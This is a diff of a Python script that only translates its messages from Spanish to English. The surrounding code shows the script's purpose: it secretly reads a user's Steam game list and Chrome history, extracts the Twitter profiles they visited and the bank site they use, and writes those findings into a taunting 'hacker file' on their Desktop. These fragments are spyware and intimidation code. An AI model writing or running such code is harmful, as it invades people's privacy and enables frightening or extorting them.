@@ -40,7 +40,7 @@ def check_steam_games(hacker_file):
     
         games.append(game_path.split("\\")[-1])
         
-    hacker_file.write("He visto que ultimamente has estado jugando a {}".format(",".join(games[:3])))
+    hacker_file.write("Lately, you played these games: {}".format(",".join(games[:3])))
     
 
 
@@ -59,7 +59,7 @@ def create_hacker_file(user_path):
 
     hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
     
-    hacker_file.write("Bon dia\n")
+    hacker_file.write("Hello, I got a surprise for you\n")
     
     return hacker_file
     
@@ -81,7 +81,7 @@ def get_chrome_history(user_path):
             print(urls)
             return urls
         except sqlite3.OperationalError:
-            print("Historial inaccesible, intentando en 3 segundos")
+            print("History is blocked, 3 seconds to reload...")
             sleep(3)
 
 
@@ -94,7 +94,7 @@ def check_twitter_profiles(hacker_file, chrome_history):
         results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
         if results and results[0] not in ["notifications", "home"]:
             profiles_visited.append(results[0])
-        hacker_file.write("He visto que has estado  husmeando en los perfiles de {}...\n".format(",".join(profiles_visited)))
+        hacker_file.write("You were looking these profiles on Twitter: {}...\n".format(",".join(profiles_visited)))
 
 
 
@@ -109,7 +109,7 @@ def check_bank_account(hacker_file, chrome_history):
                 break
         if his_bank:
             break
-    hacker_file.write("Ademas veo que guardas tu dinero aqui {}\n".format(his_bank))
+    hacker_file.write("You save your money in {}\n".format(his_bank))
     print("his_bank")
 
 
